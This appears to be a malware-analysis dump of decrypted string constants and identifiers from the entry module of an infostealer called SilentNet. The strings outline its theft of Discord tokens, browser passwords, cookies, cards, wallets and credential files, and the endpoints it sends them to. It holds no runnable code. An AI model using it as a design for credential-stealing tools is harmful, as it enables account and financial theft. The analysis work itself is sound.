"""
SilentNet Infostealer - Decompiled Module
Module: .app
Chunk size: 4201 bytes
String constants: 85 unicode, 267 identifiers

# Entry point - argument parsing, orchestration
# Original path: app/__init__.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: __mro_entries__
# identifier: bases
"'%s' object is not a mapping"
# identifier: __name__
# identifier: datetime
# identifier: now
# identifier: strftime
'%Y%m%d_%H%M%S'
# identifier: join
# identifier: __file__
'..'
# identifier: debug_dump
# identifier: makedirs
# identifier: exist_ok
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Debug dump started'
# identifier: LogType
# identifier: INFO
'dir='
# identifier: user_data
# identifier: copy
# identifier: get
# identifier: screenshot
# identifier: screenshot
'... [TRUNCATED, '
' chars total]'
'user_data.json'
# identifier: __enter__
# identifier: __exit__
# identifier: json
# identifier: dump
# identifier: indent
# identifier: default
'Dumped user_data'
# identifier: DEBUG
'path='
# identifier: collected_files
# identifier: files
# identifier: files_dir
# identifier: category
# identifier: value
# identifier: name
# identifier: wb
# identifier: write
# identifier: data
'Dumped file'
'name='
' category='
'logs.json'
# identifier: get_logs
# identifier: indent
'Dumped logs'
'Debug dump complete'
'Dump all collected data to local directory for debugging.'
# identifier: trace
# identifier: empty
'No logs to submit'
'Log list is empty'
# identifier: config
# identifier: USER_ID
# identifier: log_uuid
# identifier: noid
'Cannot submit logs'
# identifier: WARN
'Missing userId and logUuid'
# identifier: sl2
'count='
# identifier: logs
# identifier: userId
# identifier: logUuid
# identifier: http
# identifier: shard_post
'/submitLogs'
# identifier: ok
# identifier: sl3
# identifier: ok
'Logs submitted'
'Successfully sent logs to server'
# identifier: sl4
# identifier: st
# identifier: status_code
# identifier: ERROR
'resp='
# identifier: None
# identifier: sd0
'keys='
# identifier: keys
# identifier: encrypt_submission
'/submitData'
'no.resp'
'Data submission failed'
'No response received'
# identifier: sd2
'status='
# identifier: logUuid
'Data submitted'
'logUuid='
'...'
'no logUuid'
# identifier: submission_succeeded
# identifier: sd3
'ok.'
# identifier: noid
# identifier: sd4
'Parse response failed'
# identifier: sf0
# identifier: noid
'Cannot submit files'
'No logUuid available'
# identifier: sf1
'Submitting files'
'Uploading file '
'X-Tracking-ID'
'/submitFile'
# identifier: files
# identifier: extra_headers
# identifier: sf2
'.ok'
'File uploaded '
# identifier: sf3
'.fail'
'File upload failed '
# identifier: clear
# identifier: a0
# identifier: init
# identifier: time
'Starting ManagementEngine'
'Initializing application'
# identifier: enable_doh
# identifier: a1
# identifier: cfg
# identifier: init
# identifier: Fabric
# identifier: Forge
# identifier: DoubleClick
# identifier: Remote
# identifier: EXE
# identifier: DLL
# identifier: Captcha
# identifier: DiscordInjection
# identifier: Powershell
# identifier: ENV
# identifier: Minecraft
# identifier: CPyRuntime
# identifier: Unknown
# identifier: executionEnvironment
# identifier: executionEnvironmentType
# identifier: PREFIRE_ID
# identifier: prefireId
# identifier: TAG
# identifier: tag
# identifier: MC_INFO
# identifier: minecraftInfo
'Config complete'
'env='
' type='
' took='
# identifier: ms
# identifier: a2
'cfg.ok.'
# identifier: DEBUG_DUMP
# identifier: API_HOST
'a2.1'
'stg.start'
# identifier: staging
# identifier: stage_async
# identifier: a3
# identifier: sys
# identifier: system_info
# identifier: get_system_info
# identifier: systemInfo
# identifier: a4
# identifier: scr
# identifier: take_screenshot
# identifier: a5
# identifier: dsc
# identifier: discord
# identifier: get_discord_tokens
# identifier: discordTokens
# identifier: a6
'brw.cr'
# identifier: browser
# identifier: get_browser_data
# identifier: a7
'brw.fx'
# identifier: firefox
# identifier: get_firefox_passwords
# identifier: get_firefox_cookies
# identifier: get_firefox_autofills
# identifier: passwords
# identifier: cookies
# identifier: creditCards
# identifier: googleTokens
# identifier: autofills
# identifier: browserData
# identifier: a8
'brw.ok.p'
'.c'
# identifier: a9
'brw.fil'
# identifier: get_browser_files
# identifier: get_firefox_files
# identifier: append
# identifier: a10
# identifier: mcr
# identifier: minecraft
# identifier: get_minecraft_files
# identifier: a11
# identifier: wal
# identifier: wallets
# identifier: get_wallet_files
# identifier: a12
# identifier: ext
# identifier: browser_extensions
# identifier: get_browser_extension_files
# identifier: a13
# identifier: cred
# identifier: credentials
# identifier: get_credential_files
# identifier: a14
# identifier: kw
# identifier: keywords
# identifier: get_keyword_files
# identifier: a15
'fil.ok.'
# identifier: get_file_info
# identifier: fileInfo
# identifier: a16
'dbg.dmp'
# identifier: _debug_dump
# identifier: a16
'sub.dat'
# identifier: _submit_data
# identifier: a17
'sub.fil'
# identifier: _submit_files
'a.fatal'
'Fatal error'
': '
'Debug execution complete'
'total='
# identifier: a99
'dbg.fin.'
# identifier: a18
# identifier: retry
'Retrying submission'
'Primary submission failed, attempting retry'
# identifier: a19
# identifier: logs
# identifier: _submit_logs
# identifier: is_alive
# identifier: a20
'stg.wait'
'Waiting for staging'
'Staging still running, waiting...'
# identifier: a21
'stg.done'
'Staging complete'
'Staging thread finished'
'Execution complete'
'ms logs='
# identifier: __doc__
# identifier: path
# identifier: dirname
# identifier: environ
# identifier: NUITKA_PACKAGE_app
'\\not_existing'
# identifier: __path__
# identifier: origin
# identifier: has_location
# identifier: submodule_search_locations
# identifier: __cached__
# identifier: __annotations__
# identifier: os
# identifier: sys
# identifier: datetime
# identifier: config
# identifier: http
# identifier: staging
# identifier: trace
# identifier: crypto
# identifier: encrypt_submission
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: handlers
# identifier: system_info
# identifier: screenshot
# identifier: discord
# identifier: browser
# identifier: firefox
# identifier: minecraft
# identifier: wallets
# identifier: browser_extensions
# identifier: credentials
# identifier: keywords
# identifier: app
# identifier: run
'app\\__init__.py'
'<module app>'
# identifier: timestamp
# identifier: dump_dir
# identifier: dump_data
# identifier: original_len
# identifier: data_path
# identifier: hit_file
# identifier: category_dir
# identifier: file_path
# identifier: logs_path
# identifier: encrypted
# identifier: resp
# identifier: body
# identifier: files
# identifier: headers
# identifier: resp
# identifier: logs
# identifier: payload
# identifier: resp
# identifier: start_time
# identifier: staging_thread
# identifier: minecraft_envs
# identifier: cpy_envs
# identifier: env_type
# identifier: elapsed
# identifier: chromium_passwords
# identifier: chromium_cookies
# identifier: chromium_cards
# identifier: chromium_tokens
# identifier: chromium_autofills
# identifier: firefox_passwords
# identifier: firefox_cookies
# identifier: firefox_autofills
# identifier: browser_files
# identifier: firefox_files
# identifier: hit_file
# identifier: minecraft_files
# identifier: wallet_files
# identifier: extension_files
# identifier: credential_files
# identifier: existing_names
# identifier: keyword_files
# identifier: __spec__
